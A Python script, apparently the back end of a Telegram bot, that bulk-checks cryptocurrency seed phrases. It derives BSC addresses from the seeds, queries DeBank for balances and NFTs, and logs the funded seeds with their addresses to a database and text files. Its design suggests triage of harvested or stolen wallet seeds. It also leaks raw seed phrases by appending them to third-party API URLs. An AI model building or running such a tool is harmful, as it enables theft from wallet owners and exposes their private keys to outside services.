import grequests
from web3 import Web3
from models import *


def get_address_by_seed(seed):
    try:
        url = 'https://bsc-dataseed1.binance.org'
        web3 = Web3(Web3.HTTPProvider(url))
        web3.eth.account.enable_unaudited_hdwallet_features()
        address = web3.eth.account.from_mnemonic(seed).address
        return address
    except:
        return None


def get_all_balance(seeds, telegram_id):
    all_balance_urls = []
    total_nft_urls = []
    for seed in seeds:
        address = get_address_by_seed(seed)
        if address is not None:
            get_all_balance_url = f'https://openapi.debank.com/v1/user/total_balance?id={address}&&{address}&&{seed}'
            total_nft_url = f'https://openapi.debank.com/v1/user/nft_list?id={address}&&{address}&&{seed}'
            all_balance_urls.append(get_all_balance_url)
            total_nft_urls.append(total_nft_url)
    print(len(all_balance_urls))
    req_balance = (grequests.get(url) for url in all_balance_urls)
    res_balance = grequests.map(req_balance)
    for balance in res_balance:
        try:
            url_address = balance.url.split('&&')
            address = url_address[-2]
            seed = url_address[-1].replace('%20', ' ')

            total_bal = round(balance.json()['total_usd_value'], 1)
            try:
                with db:
                    query = Seed.get_or_none(seed=seed)
                    if query is None:
                        Seed(seed=seed, balance=total_bal).save()
            except:
                print('ошибка бази данных')

            if total_bal != 0:
                with open(f'balance{telegram_id}.txt', 'a') as file:
                    file.write(f'{total_bal}|||{address}|||{seed}\n')
        except:
            pass
    with open(f'balance{telegram_id}.txt', 'a') as file:
        file.write('Done')

    req_nft = (grequests.get(url) for url in total_nft_urls)
    res_nft = grequests.map(req_nft)
    for nft in res_nft:
        try:
            url_address = nft.url.split('&&')
            address = url_address[-2]
            seed = url_address[-1].replace('%20', ' ')

            total_bal = len(nft.json())
            if total_bal != 0:
                with open(f'nft{telegram_id}.txt', 'a') as file:
                    file.write(f'{total_bal}|||{address}|||{seed}\n')
        except:
            pass
    with open(f'nft{telegram_id}.txt', 'a') as file:
        file.write('Done')
    return f'balance{telegram_id}.txt', f'nft{telegram_id}.txt'